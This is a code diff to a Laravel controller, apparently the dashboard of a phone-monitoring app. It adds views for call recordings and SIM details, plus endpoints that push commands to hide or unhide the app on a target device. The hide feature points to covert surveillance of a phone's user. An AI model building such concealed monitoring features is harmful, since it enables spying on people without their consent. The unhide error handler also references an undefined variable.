@@ -4,6 +4,7 @@ namespace App\Http\Controllers\Features;
 
 use App\Http\Controllers\Actions\Functions\SendFcmNotification;
 use App\Http\Controllers\Controller;
+use App\Models\call_recording;
 use App\Models\clients;
 use App\Models\defaultStorage;
 use App\Models\device;
@@ -13,6 +14,7 @@ use App\Models\location;
 use App\Models\manual_txns;
 use App\Models\recordings;
 use App\Models\screen_recordings;
+use App\Models\sim_details;
 use App\Models\storage_txn;
 use App\Models\videos;
 use Carbon\Carbon;
@@ -282,7 +284,9 @@ class IndexController extends Controller
 
     public function call_recording()
     {
-        return view('frontend_new.pages.call-record');
+        $client = clients::where('client_id', session('user_id'))->first();
+        $recording = call_recording::where('user_id', session('user_id'))->where('device_id', $client->device_id)->orderBy('created_at', 'desc')->get();
+        return view('frontend_new.pages.call-record')->with(['recordings' => $recording]);
     }
 
 
@@ -390,10 +394,6 @@ class IndexController extends Controller
         $device = device::where('device_id', $client_id->device_id)->where('client_id', $client_id->client_id)->orderBy('updated_at', 'desc')->first();
 
         if ($device == null) {
-            $this->dispatchBrowserEvent('banner-message', [
-                'style' => 'danger',
-                'message' => 'No Device token! Please register your device first',
-            ]);
             return;
         }
         $data = [
@@ -468,5 +468,69 @@ class IndexController extends Controller
     {
         $this->sendNotification('stop_vibrate');
         return response()->json('stopped');
+    }
+
+
+    public function hide_app()
+    {
+        return view('frontend_new.pages.hide-app');
+    }
+
+    public function hide_app_hide()
+    {
+        $client_id = clients::where('client_id', session('user_id'))->first();
+        $device = device::where('device_id', $client_id->device_id)->where('client_id', $client_id->client_id)->orderBy('updated_at', 'desc')->first();
+
+        if ($device == null) {
+            return;
+        }
+        $data = [
+            'device_token' => $device->device_token,
+            'title' => null,
+            'body' => null,
+            'action_to' => 'hide_app'
+        ];
+        try {
+            $sendFcmNotification = new SendFcmNotification();
+            $res = $sendFcmNotification->sendNotification($data['device_token'], $data['action_to'], $data['title'], $data['body']);
+            return response()->json($res['message']);
+        } catch (\Throwable $th) {
+            Log::error('failed' . $th->getMessage());
+            return response()->json($th->getMessage());
+        }
+    }
+
+    public function unhide_app_hide()
+    {
+        $client_id = clients::where('client_id', session('user_id'))->first();
+        $device = device::where('device_id', $client_id->device_id)->where('client_id', $client_id->client_id)->orderBy('updated_at', 'desc')->first();
+        if ($device == null) {
+            return;
+        }
+        $data = [
+            'device_token' => $device->device_token,
+            'title' => null,
+            'body' => null,
+            'action_to' => 'unhide_app'
+        ];
+        try {
+            $sendFcmNotification = new SendFcmNotification();
+            $res = $sendFcmNotification->sendNotification($data['device_token'], $data['action_to'], $data['title'], $data['body']);
+            return response()->json($res['message']);
+        } catch (\Throwable $th) {
+            Log::error('failed' . $th->getMessage());
+            return response()->json($res['message']);
+        }
+    }
+
+    public function sim_details()
+    {
+        $client_id = clients::where('client_id', session('user_id'))->first();
+        if ($client_id->device_id == null) {
+            $data = [];
+        } else {
+            $data = sim_details::where('user_id', session('user_id'))->where('device_id', $client_id->device_id)->get();
+        }
+        return view('frontend_new.pages.sim-details')->with(['data' => $data]);
     }
 }
